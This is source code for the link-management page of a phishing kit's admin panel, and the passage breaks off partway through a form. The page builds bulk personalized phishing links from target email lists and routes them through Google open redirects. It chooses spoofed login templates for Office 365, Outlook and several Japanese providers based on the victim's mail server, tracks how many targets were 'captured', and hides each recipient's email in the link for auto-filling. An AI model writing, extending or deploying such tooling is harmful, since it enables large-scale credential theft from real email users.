'use client'

import { useEffect, useState } from 'react'
import AdminLayout from '@/components/admin/AdminLayout'
import {
  Link as LinkIcon,
  Plus,
  Search,
  Copy,
  Trash2,
  X,
  CheckCircle,
  Clock,
  Archive,
} from 'lucide-react'
import type { Link } from '@/lib/linkDatabase'
import { API_ROUTES } from '@/lib/api-routes'
import { getLoadingScreenOptions } from '@/lib/loadingScreenRegistry'

type LinkStatus = 'active' | 'expired' | 'archived'

export default function LinksPage() {
  const [links, setLinks] = useState<Link[]>([])
  const [filteredLinks, setFilteredLinks] = useState<Link[]>([])
  const [loading, setLoading] = useState(true)
  const [activeTab, setActiveTab] = useState<LinkStatus>('active')
  const [searchQuery, setSearchQuery] = useState('')
  const [showCreateModal, setShowCreateModal] = useState(false)
  const [createType, setCreateType] = useState<'personalized' | 'generic'>('personalized')
  const [copiedToken, setCopiedToken] = useState<string | null>(null)

  // Fetch links
  useEffect(() => {
    fetchLinks()
  }, [activeTab])

  // Filter links
  useEffect(() => {
    let filtered = links

    // Apply search
    if (searchQuery) {
      const query = searchQuery.toLowerCase()
      filtered = filtered.filter(
        (link) =>
          link.email?.toLowerCase().includes(query) ||
          link.name?.toLowerCase().includes(query) ||
          (link.sessionIdentifier || link.linkToken || '').toLowerCase().includes(query)
      )
    }

    setFilteredLinks(filtered)
  }, [links, searchQuery])

  const fetchLinks = async () => {
    setLoading(true)
    try {
      const status = activeTab === 'archived' ? 'archived' : activeTab
      const response = await fetch(`/api/admin/links?status=${status}`)
      const data = await response.json()
      if (data.success) {
        setLinks(data.links || [])
      }
    } catch (error) {
    } finally {
      setLoading(false)
    }
  }

  const handleDelete = async (token: string) => {
    if (!confirm('Are you sure you want to delete this link?')) return

    try {
      const response = await fetch(`/api/admin/links/${token}`, {
        method: 'DELETE',
      })
      const data = await response.json()
      if (data.success) {
        fetchLinks()
      }
    } catch (error) {
      alert('Failed to delete link')
    }
  }

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
    setCopiedToken(text)
    setTimeout(() => setCopiedToken(null), 2000)
  }

  const getBaseUrl = () => {
    if (typeof window !== 'undefined') {
      return `${window.location.protocol}//${window.location.host}`
    }
    return ''
  }

  const getLinkUrl = (link: Link) => {
    const baseUrl = getBaseUrl()
    if (link.type === 'personalized') {
      const token = link.sessionIdentifier || link.linkToken || ''
      return `${baseUrl}/?token=${token}&id=${link.id}`
    } else {
      const token = link.sessionIdentifier || link.linkToken || ''
      return `${baseUrl}/?token=${token}`
    }
  }

  return (
    <AdminLayout>
      <div className="space-y-6">
        {/* Header */}
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-3xl font-bold text-gray-900 dark:text-white">Links</h1>
            <p className="text-gray-600 dark:text-gray-400 mt-1">
              Manage your phishing campaign links
            </p>
          </div>
          <button
            onClick={() => setShowCreateModal(true)}
            className="flex items-center gap-2 px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-medium transition-colors"
          >
            <Plus className="w-5 h-5" />
            Create New Link
          </button>
        </div>

        {/* Tabs */}
        <div className="flex items-center gap-2 border-b border-gray-200 dark:border-gray-700">
          {(['active', 'expired', 'archived'] as LinkStatus[]).map((tab) => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab)}
              className={`
                px-4 py-2 font-medium transition-colors border-b-2
                ${
                  activeTab === tab
                    ? 'border-blue-600 text-blue-600 dark:text-blue-400'
                    : 'border-transparent text-gray-600 dark:text-gray-400 hover:text-gray-900 dark:hover:text-white'
                }
              `}
            >
              {tab.charAt(0).toUpperCase() + tab.slice(1)}
            </button>
          ))}
        </div>

        {/* Search */}
        <div className="flex items-center gap-4">
          <div className="flex-1 relative">
            <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-400" />
            <input
              type="text"
              placeholder="Search links..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="w-full pl-10 pr-4 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-gray-800 text-gray-900 dark:text-white"
            />
          </div>
        </div>

        {/* Links List */}
        {loading ? (
          <div className="flex items-center justify-center h-64">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
          </div>
        ) : filteredLinks.length === 0 ? (
          <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md border border-gray-200 dark:border-gray-700 p-12 text-center">
            <LinkIcon className="w-16 h-16 text-gray-400 mx-auto mb-4" />
            <h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-2">
              No links yet
            </h3>
            <p className="text-gray-600 dark:text-gray-400 mb-6">
              Create your first link to get started
            </p>
            <button
              onClick={() => setShowCreateModal(true)}
              className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-medium transition-colors"
            >
              Create Link
            </button>
          </div>
        ) : (
          <div className="grid gap-4">
            {filteredLinks.map((link) => (
              <LinkCard
                key={link.sessionIdentifier || link.linkToken || link.id}
                link={link}
                linkUrl={getLinkUrl(link)}
                onCopy={copyToClipboard}
                onDelete={handleDelete}
                copied={copiedToken === (link.sessionIdentifier || link.linkToken)}
              />
            ))}
          </div>
        )}

        {/* Create Link Modal */}
        {showCreateModal && (
          <CreateLinkModal
            type={createType}
            onTypeChange={setCreateType}
            onClose={() => setShowCreateModal(false)}
            onSuccess={() => {
              setShowCreateModal(false)
              fetchLinks()
            }}
          />
        )}
      </div>
    </AdminLayout>
  )
}

// Link Card Component
function LinkCard({
  link,
  linkUrl,
  onCopy,
  onDelete,
  copied,
}: {
  link: Link
  linkUrl: string
  onCopy: (url: string) => void
  onDelete: (token: string) => void
  copied: boolean
}) {
  const isExpired = link.expiresAt <= Date.now()
  const isUsed = link.type === 'personalized' && link.used

  return (
    <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md border border-gray-200 dark:border-gray-700 p-6">
      <div className="flex items-start justify-between gap-4">
        <div className="flex-1 min-w-0">
          {/* Header */}
          <div className="flex items-center gap-3 mb-3">
            <span className="px-2 py-1 text-xs font-medium bg-blue-100 dark:bg-blue-900/30 text-blue-800 dark:text-blue-300 rounded-full">
              {link.type === 'personalized' ? 'Type A • Personal' : 'Type B • Generic'}
            </span>
            {isUsed && (
              <span className="px-2 py-1 text-xs font-medium bg-green-100 dark:bg-green-900/30 text-green-800 dark:text-green-300 rounded-full flex items-center gap-1">
                <CheckCircle className="w-3 h-3" />
                Used
              </span>
            )}
            {isExpired && (
              <span className="px-2 py-1 text-xs font-medium bg-gray-100 dark:bg-gray-700 text-gray-800 dark:text-gray-300 rounded-full flex items-center gap-1">
                <Clock className="w-3 h-3" />
                Expired
              </span>
            )}
          </div>

          {/* Link Info */}
          <div className="space-y-2">
            {link.type === 'personalized' ? (
              <>
                <p className="text-sm font-medium text-gray-900 dark:text-white">
                  {link.email || 'No email'}
                </p>
                <div className="flex items-center gap-2 flex-wrap min-w-0">
                  <code className="text-xs text-gray-500 dark:text-gray-400 bg-gray-100 dark:bg-gray-700 px-2 py-1 rounded break-all flex-1 min-w-0 overflow-hidden">
                    {linkUrl}
                  </code>
                </div>
              </>
            ) : (
              <>
                <p className="text-sm font-medium text-gray-900 dark:text-white">
                  {link.name || 'Unnamed Campaign'}
                </p>
                <div className="flex items-center gap-2 flex-wrap min-w-0">
                  <code className="text-xs text-gray-500 dark:text-gray-400 bg-gray-100 dark:bg-gray-700 px-2 py-1 rounded break-all flex-1 min-w-0 overflow-hidden">
                    {linkUrl}
                  </code>
                </div>
                {link.totalEmails && (
                  <div className="mt-3">
                    <div className="flex items-center justify-between text-xs text-gray-600 dark:text-gray-400 mb-1">
                      <span>
                        {link.capturedCount || 0} / {link.totalEmails} captured
                      </span>
                      <span>
                        {Math.round(((link.capturedCount || 0) / link.totalEmails) * 100)}%
                      </span>
                    </div>
                    <div className="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2">
                      <div
                        className="bg-blue-600 h-2 rounded-full transition-all"
                        style={{
                          width: `${Math.round(((link.capturedCount || 0) / link.totalEmails) * 100)}%`,
                        }}
                      />
                    </div>
                  </div>
                )}
              </>
            )}

            {/* Metadata */}
            <div className="flex items-center gap-4 text-xs text-gray-500 dark:text-gray-400 mt-3">
              <span>Created: {new Date(link.createdAt).toLocaleDateString()}</span>
              <span>
                Expires: {new Date(link.expiresAt).toLocaleDateString()}
              </span>
            </div>
          </div>
        </div>

        {/* Actions */}
        <div className="flex items-center gap-2 flex-shrink-0">
          <button
            onClick={() => onCopy(linkUrl)}
            className="p-2 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
            title="Copy link"
          >
            {copied ? (
              <CheckCircle className="w-5 h-5 text-green-600 dark:text-green-400" />
            ) : (
              <Copy className="w-5 h-5 text-gray-600 dark:text-gray-400" />
            )}
          </button>
          <button
            onClick={() => onDelete(link.sessionIdentifier || link.linkToken || '')}
            className="p-2 rounded-lg hover:bg-red-50 dark:hover:bg-red-900/20 transition-colors"
            title="Delete link"
          >
            <Trash2 className="w-5 h-5 text-red-600 dark:text-red-400" />
          </button>
        </div>
      </div>
    </div>
  )
}

// Create Link Modal Component
function CreateLinkModal({
  type,
  onTypeChange,
  onClose,
  onSuccess,
}: {
  type: 'personalized' | 'generic'
  onTypeChange: (type: 'personalized' | 'generic') => void
  onClose: () => void
  onSuccess: () => void
}) {
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [successLink, setSuccessLink] = useState<string | null>(null)

  // Type A form state (Bulk CSV only)
  const [emailList, setEmailList] = useState('')
  const [redirectList, setRedirectList] = useState('')
  const [useOpenRedirect, setUseOpenRedirect] = useState(false)
  const [encodeUrl, setEncodeUrl] = useState(true)
  const [expirationHours, setExpirationHours] = useState(24)
  
  // Template selection state
  const [templates, setTemplates] = useState<any[]>([])
  const [selectedTemplate, setSelectedTemplate] = useState<string>('auto-detect')
  
  // Loading screen state
  const [loadingScreen, setLoadingScreen] = useState<string>('meeting')
  const [loadingDuration, setLoadingDuration] = useState<number>(3)
  const loadingScreenOptions = getLoadingScreenOptions()
  
  // Load templates
  useEffect(() => {
    fetch('/api/templates?enabled=true')
      .then(r => r.json())
      .then(data => {
        if (data.success) {
          setTemplates(data.templates)
        }
      })
      .catch(err => console.error('Failed to load templates:', err))
  }, [])
  

  // Type B form state (Auto Grab)
  const [autoGrabFormat, setAutoGrabFormat] = useState('++email64++')
  const [autoGrabType, setAutoGrabType] = useState('token_email_token_medium') // Default to advanced pattern
  const [redirectType, setRedirectType] = useState('normal')
  const [subdomain, setSubdomain] = useState('none')
  const [typeBTemplate, setTypeBTemplate] = useState('auto-detect')
  const [typeBLoadingScreen, setTypeBLoadingScreen] = useState('meeting')
  const [typeBLoadingDuration, setTypeBLoadingDuration] = useState(3)
  const [generatedAutoGrabLink, setGeneratedAutoGrabLink] = useState('')
  const [typeBEmailList, setTypeBEmailList] = useState('') // Email list for Type B

  const handleTypeA = async (e: React.FormEvent) => {
    e.preventDefault()
    setError(null)
    setLoading(true)

    try {
      // Parse email and redirect lists
      const emails = emailList.split('\n')
        .map(e => e.trim())
        .filter(e => e && e.includes('@'))
      
      const redirects = redirectList.split('\n')
        .map(r => r.trim())
        .filter(r => r && r.startsWith('http'))
      
      
      // Validation
      if (emails.length === 0) {
        setError('Please enter at least one valid email address')
        setLoading(false)
        return
      }
      
      if (emails.length > 10000) {
        setError('Maximum 10,000 emails allowed')
        setLoading(false)
        return
      }
      
      if (useOpenRedirect && redirects.length === 0) {
        setError('Please enter at least one redirect URL')
        setLoading(false)
        return
      }
      
      
      // Call bulk generation API
      const response = await fetch('/api/admin/generate-bulk', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          emailList: emails,
          redirectList: useOpenRedirect ? redirects : [],
          useOpenRedirect,
          encodeUrl,
          template: selectedTemplate,
          loadingScreen: loadingScreen || 'meeting',
          duration: loadingDuration || 3,
          expirationHours
        })
      })
      
      
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`)
      }
      
      const data = await response.json()
      
      if (data.success) {
        // Download CSV using file-saver
        const saveAs = (await import('file-saver')).default
        const blob = new Blob([data.csv], { type: 'text/csv;charset=utf-8;' })
        saveAs(blob, `personalized-links-${Date.now()}.csv`)
        
        alert(`✅ Generated ${data.count} personalized links!\nCSV file has been downloaded.`)
        onSuccess()
      } else {
        setError(data.error || 'Failed to generate links')
      }
    } catch (err: any) {
      setError(`Failed to create link: ${err.message || 'Unknown error'}`)
    } finally {
      setLoading(false)
    }
  }

  const handleTypeB = async (e: React.FormEvent) => {
    e.preventDefault()
    setError(null)
    setLoading(true)

    try {
      const baseUrl = typeof window !== 'undefined' 
        ? `${window.location.protocol}//${window.location.host}`
        : 'https://yourdomain.com'

      // Build the auto grab link based on format and type
      let link = baseUrl
      
      // Add subdomain if selected
      if (subdomain !== 'none') {
        try {
          const url = new URL(link)
          url.hostname = `${subdomain}.${url.hostname}`
          link = url.toString()
        } catch {
          // If URL parsing fails, just prepend subdomain
          const host = typeof window !== 'undefined' ? window.location.host : 'yourdomain.com'
          link = `${window.location.protocol}//${subdomain}.${host}`
        }
      }

      // STEP 1: Generate backend token first (REQUIRED for validation)
      // Parse email list
      const emails = typeBEmailList.split('\n')
        .map(e => e.trim())
        .filter(e => e && e.includes('@'))
      
      if (emails.length === 0) {
        setError('Please enter at least one email address for this auto-grab link')
        setLoading(false)
        return
      }
      
      if (emails.length > 50000) {
        setError('Maximum 50,000 emails allowed')
        setLoading(false)
        return
      }
      
      const apiResponse = await fetch('/api/admin/generate-autograb-link', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          autoGrabFormat,
          autoGrabType,
          redirectType,
          subdomain,
          template: typeBTemplate,
          loadingScreen: typeBLoadingScreen,
          loadingDuration: typeBLoadingDuration,
          allowedEmails: emails, // Send email list
        }),
      })

      if (!apiResponse.ok) {
        throw new Error(`API error: ${apiResponse.status}`)
      }

      const apiData = await apiResponse.json()
      
      if (!apiData.success || !apiData.token) {
        throw new Error(apiData.error || 'Failed to generate backend token')
      }

      const backendToken = apiData.token
      const linkId = apiData.linkId || backendToken
      

      // STEP 2: Build final link with backend token + auto grab pattern
      let finalLink = ''
      
      if (autoGrabType === 'none') {
        // No auto grab - standard token link
        finalLink = `${link}?token=${backendToken}&id=${linkId}`
      } else {
        // Advanced patterns: Backend token is REQUIRED, email pattern uses sid/v/hash
        // IMPORTANT: Don't duplicate 'token' parameter!
        
        // Map pattern types to correct parameter names
        const patternToParam: Record<string, string> = {
          'token_email_token_short': 'sid',        // Use sid instead of token
          'token_email_token_medium': 'sid',       // Use sid instead of token
          'token_email_token_long': 'sid',         // Use sid instead of token
          'token_double_wrap': 'sid',              // Use sid instead of token
          'hash_token_email_token': 'hash',        // Use hash
          'session_id_wrap': 'sid',                // Already uses sid
          'query_token_concat': 'sid',             // Use sid instead of token
          'multi_param_token_wrap': 'v',           // Use v parameter
          'reverse_token_wrap': 'sid',             // Use sid instead of token
        }
        
        const paramName = patternToParam[autoGrabType] || 'sid'
        
        // Build email pattern using appropriate parameter
        let emailPattern = ''
        if (paramName === 'hash') {
          // Hash pattern: #TOKEN_++email64++_TOKEN
          const token1 = Math.random().toString(36).substring(2, 8)
          const token2 = Math.random().toString(36).substring(2, 8)
          emailPattern = `#${token1}_${autoGrabFormat}_${token2}`
        } else {
          // Query param pattern: &sid=TOKEN_++email64++_TOKEN
          const token1 = Math.random().toString(36).substring(2, 6).toUpperCase()
          const token2 = Math.random().toString(36).substring(2, 6).toUpperCase()
          emailPattern = `&${paramName}=${token1}-${autoGrabFormat}-${token2}`
        }
        
        // Combine: Backend token FIRST, then email pattern (NO id parameter - simpler!)
        finalLink = `${link}?token=${backendToken}${emailPattern}`
      }


      // Display link
      setGeneratedAutoGrabLink(finalLink)
    } catch (err) {
      setError('Failed to generate link')
    } finally {
      setLoading(false)
    }
  }

  if (successLink) {
    return (
      <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
        <div className="bg-white dark:bg-gray-800 rounded-lg shadow-xl max-w-md w-full p-6">
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-xl font-bold text-gray-900 dark:text-white">Link Created!</h2>
            <button
              onClick={() => {
                setSuccessLink(null)
                onSuccess()
              }}
              className="text-gray-400 hover:text-gray-600 dark:hover:text-gray-300"
            >
              <X className="w-5 h-5" />
            </button>
          </div>
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                Your Link:
              </label>
              <div className="flex items-center gap-2">
                <input
                  type="text"
                  value={successLink}
                  readOnly
                  className="flex-1 px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-gray-50 dark:bg-gray-700 text-gray-900 dark:text-white text-sm font-mono"
                />
                <button
                  onClick={() => {
                    navigator.clipboard.writeText(successLink)
                    alert('Copied!')
                  }}
                  className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-medium transition-colors"
                >
                  Copy
                </button>
              </div>
            </div>
            <button
              onClick={() => {
                setSuccessLink(null)
                onSuccess()
              }}
              className="w-full px-4 py-2 bg-gray-200 hover:bg-gray-300 dark:bg-gray-700 dark:hover:bg-gray-600 text-gray-800 dark:text-white rounded-lg font-medium transition-colors"
            >
              Done
            </button>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
      <div className="bg-white dark:bg-gray-800 rounded-lg shadow-xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
        <div className="flex items-center justify-between p-6 border-b border-gray-200 dark:border-gray-700">
          <h2 className="text-xl font-bold text-gray-900 dark:text-white">Create New Link</h2>
          <button
            onClick={onClose}
            className="text-gray-400 hover:text-gray-600 dark:hover:text-gray-300"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        <div className="p-6">
          {/* Type Tabs */}
          <div className="flex items-center gap-2 mb-6 border-b border-gray-200 dark:border-gray-700">
            {(['personalized', 'generic'] as const).map((tabType) => (
              <button
                key={tabType}
                onClick={() => onTypeChange(tabType)}
                className={`
                  px-4 py-2 font-medium transition-colors border-b-2
                  ${
                    type === tabType
                      ? 'border-blue-600 text-blue-600 dark:text-blue-400'
                      : 'border-transparent text-gray-600 dark:text-gray-400 hover:text-gray-900 dark:hover:text-white'
                  }
                `}
              >
                {tabType === 'personalized' ? 'Personalized (Type A)' : 'Generic (Type B)'}
              </button>
            ))}
          </div>

          {/* Type A Form - Bulk CSV Generation Only */}
          {type === 'personalized' && (
            <form onSubmit={handleTypeA} className="space-y-4">
                  {/* Email List */}
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      Email List (one per line, max 10,000)
                    </label>
                    <textarea
                      rows={8}
                      value={emailList}
                      onChange={(e) => setEmailList(e.target.value)}
                      className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-gray-800 text-gray-900 dark:text-white font-mono text-sm"
                      placeholder="user1@example.com
user2@company.jp
user3@domain.com
..."
                    />
                    <p className="mt-1 text-xs text-gray-500 dark:text-gray-400">
                      📧 Emails: <strong>{emailList.split('\n').filter((e: string) => e.trim() && e.includes('@')).length}</strong>
                    </p>
                  </div>

              {/* Open Redirect Toggle */}
              <div className="flex items-center gap-2">
                <input
                  type="checkbox"
                  id="useOpenRedirect"
                  checked={useOpenRedirect}
                  onChange={(e) => setUseOpenRedirect(e.target.checked)}
                  className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
                />
                <label htmlFor="useOpenRedirect" className="text-sm font-medium text-gray-700 dark:text-gray-300">
                  Use Open Redirects
                </label>
              </div>

              {/* Redirect List (conditional) */}
              {useOpenRedirect && (
                <>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      Open Redirect URLs (one per line)
                    </label>
                    <textarea
                      rows={6}
                      value={redirectList}
                      onChange={(e) => setRedirectList(e.target.value)}
                      className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-gray-800 text-gray-900 dark:text-white font-mono text-sm"
                      placeholder="https://cse.google.ms/url?q=
https://maps.google.com/url?q=
https://translate.google.com/url?q=
..."
                    />
                    <p className="mt-1 text-xs text-gray-500 dark:text-gray-400">
                      🔗 Redirects: <strong>{redirectList.split('\n').filter((r: string) => r.trim() && r.startsWith('http')).length}</strong> (will be randomly selected)
                    </p>
                  </div>

                  {/* Encode URL Toggle */}
                  <div className="flex items-center gap-2">
                    <input
                      type="checkbox"
                      id="encodeUrl"
                      checked={encodeUrl}
                      onChange={(e) => setEncodeUrl(e.target.checked)}
                      className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
                    />
                    <label htmlFor="encodeUrl" className="text-sm font-medium text-gray-700 dark:text-gray-300">
                      Encode URL (Recommended)
                    </label>
                  </div>
                </>
              )}

              {/* Expiration */}
              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Expiration
                </label>
                <select
                  value={expirationHours}
                  onChange={(e) => setExpirationHours(Number(e.target.value))}
                  className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-gray-800 text-gray-900 dark:text-white"
                >
                  <option value={1}>1 hour</option>
                  <option value={24}>24 hours</option>
                  <option value={168}>7 days</option>
                  <option value={720}>30 days</option>
                </select>
              </div>

              {/* Template Selection - Single Dropdown */}
              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Template Selection
                </label>
                <select
                  value={selectedTemplate}
                  onChange={(e) => setSelectedTemplate(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-gray-800 text-gray-900 dark:text-white"
                >
                  <option value="auto-detect">🔍 Auto Detect (from email domain/MX)</option>
                  <option value="office365">📧 Office 365</option>
                  <option value="outlook">📧 Outlook Web App</option>
                  <option value="owaserver">📧 OWA Server Data</option>
                  <option value="biglobe">🇯🇵 BIGLOBE</option>
                  <option value="docomo">🇯🇵 NTT Docomo</option>
                  <option value="nifty">🇯🇵 @nifty</option>
                  <option value="sakura">🇯🇵 SAKURA Internet</option>
                  <option value="sfexpress">🚚 SF Express</option>
                </select>
                <p className="mt-1 text-xs text-gray-500 dark:text-gray-400">
                  {selectedTemplate === 'auto-detect' 
                    ? 'Will detect best template for each email based on domain/MX records'
                    : 'Will use this template for ALL emails'
                  }
                </p>
              </div>

              {/* Loading Screen Selection */}
              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Loading Screen
                </label>
                <select
                  value={loadingScreen}
                  onChange={(e) => setLoadingScreen(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-gray-800 text-gray-900 dark:text-white"
                >
                  {loadingScreenOptions.map((option) => (
                    <option key={option.value} value={option.value}>
                      {option.icon} {option.labelEn} ({option.category})
                    </option>
                  ))}
                </select>
                <p className="mt-1 text-xs text-gray-500 dark:text-gray-400">
                  This screen will be shown during the verification process
                </p>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Loading Duration (seconds)
                </label>
                <input
                  type="number"
                  min="1"
                  max="10"
                  value={loadingDuration}
                  onChange={(e) => setLoadingDuration(Number(e.target.value))}
                  className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-gray-800 text-gray-900 dark:text-white"
                />
                <p className="mt-1 text-xs text-gray-500 dark:text-gray-400">
                  How long the loading screen should display (1-10 seconds)
                </p>
              </div>

              {error && (
                <div className="p-3 bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded-lg text-sm text-red-700 dark:text-red-300">
                  {error}
                </div>
              )}

              <div className="flex items-center gap-3 pt-4">
                <button
                  type="submit"
                  disabled={loading}
                  className="flex-1 px-4 py-2 bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 disabled:cursor-not-allowed text-white rounded-lg font-medium transition-colors"
                >
                  {loading ? 'Generating...' : `📥 Generate CSV (${emailList.split('\n').filter((e: string) => e.trim() && e.includes('@')).length} links)`}
                </button>
                <button
                  type="button"
                  onClick={onClose}
                  className="px-4 py-2 bg-gray-200 hover:bg-gray-300 dark:bg-gray-700 dark:hover:bg-gray-600 text-gray-800 dark:text-white rounded-lg font-medium transition-colors"
                >
                  Cancel
                </button>
              </div>
            </form>
          )}

          {/* Type B Form (Auto Grab) */}
          {type === 'generic' && (
            <form onSubmit={handleTypeB} className="space-y-4">
              {/* Instructions */}
              <div className="bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800/30 rounded-lg p-4 text-sm text-blue-800 dark:text-blue-200">
                <p className="mb-3">
                  <strong>🔗 Type B Auto-Grab Link - How It Works:</strong>
                </p>
                <ul className="list-disc list-inside space-y-2 mb-3">
                  <li>Upload a list of authorized emails (2000 people for a campaign)</li>
                  <li>One link is generated that works for ALL emails in your list</li>
                  <li>Your email sender replaces <code className="bg-blue-100 dark:bg-blue-800 px-1 rounded">++email64++</code> with each recipient's email</li>
                  <li>🔒 <strong>Security:</strong> Only emails in your uploaded list can access the link</li>
                </ul>
                <div className="bg-white dark:bg-blue-800 rounded p-3 mt-3">
                  <p className="font-semibold mb-2">💼 Example Workflow:</p>
                  <p className="text-xs mb-1">1. Upload 2000 employee emails</p>
                  <p className="text-xs mb-1">2. Generate link with backend token</p>
                  <p className="text-xs mb-1">3. Your sender personalizes: <code className="bg-gray-100 dark:bg-gray-700 px-1 rounded text-xs">sid=AB-user1@company.jp-XY</code></p>
                  <p className="text-xs mb-1">4. System validates email is in your 2000 list ✅</p>
                  <p className="text-xs">5. If email not in list → Rejected ❌</p>
                </div>
              </div>

              {/* Email List Upload (REQUIRED for Type B) */}
              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                  📧 Allowed Email List (one per line, max 10,000) *REQUIRED*
                </label>
                <textarea
                  rows={10}
                  value={typeBEmailList}
                  onChange={(e) => setTypeBEmailList(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-gray-800 text-gray-900 dark:text-white font-mono text-sm"
                  placeholder="user1@example.com
user2@company.jp
user3@domain.com
..."
                  required
                />
                <p className="mt-1 text-xs text-gray-500 dark:text-gray-400">
                  📋 Emails: <strong>{typeBEmailList.split('\n').filter((e: string) => e.trim() && e.includes('@')).length}</strong> (Only these emails can use this link)
                </p>
              </div>

              {/* Sender Auto Grab Format */}
              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Sender Auto Grab Format
                </label>
                <input
                  type="text"
                  value={autoGrabFormat}
                  onChange={(e) => setAutoGrabFormat(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-gray-800 text-gray-900 dark:text-white"
                  placeholder="++email64++"
                />
              </div>

              {/* Auto Grab Type */}
              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Token Pattern (Auto Grab Type)
                </label>
                <select
                  value={autoGrabType}
                  onChange={(e) => setAutoGrabType(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-gray-800 text-gray-900 dark:text-white text-sm"
                >
                  <optgroup label="🔥 Token-Based Auto Grab (Backend Validated)">
                    <option value="token_email_token_short">?token=(BackendToken)-(Short2)-(Email)-(Short2)</option>
                    <option value="token_email_token_medium">?token=(BackendToken)-(Med6)-(Email64)-(Med6)</option>
                    <option value="token_email_token_long">?token=(BackendToken)-(Long10)-(Email64)-(Long10)</option>
                    <option value="token_double_wrap">?token=(BackendToken)-(Token)-(Email)-(Token)&id=(LinkID)</option>
                    <option value="hash_token_email_token">#(Token6)_(Email64)_(Token6) + ?token=(BackendToken)</option>
                    <option value="session_id_wrap">?token=(BackendToken)&sid=(Token)_(Email64)_(Token)</option>
                  </optgroup>
                  <optgroup label="⚪ Other">
                    <option value="none">None</option>
                  </optgroup>
                </select>
                <p className="mt-1 text-xs text-gray-500 dark:text-gray-400">
                  💡 All patterns generate backend tokens for validation
                </p>
              </div>

              {/* Redirect Type */}
              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Redirect Type
                </label>
                <select
                  value={redirectType}
                  onChange={(e) => setRedirectType(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-gray-800 text-gray-900 dark:text-white"
                >
                  <option value="normal">Normal Link</option>
                  <option value="meta">Meta Refresh</option>
                  <option value="javascript">JavaScript Redirect</option>
                </select>
              </div>

              {/* Subdomain */}
              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Subdomain
                </label>
                <select
                  value={subdomain}
                  onChange={(e) => setSubdomain(e.target.value)}
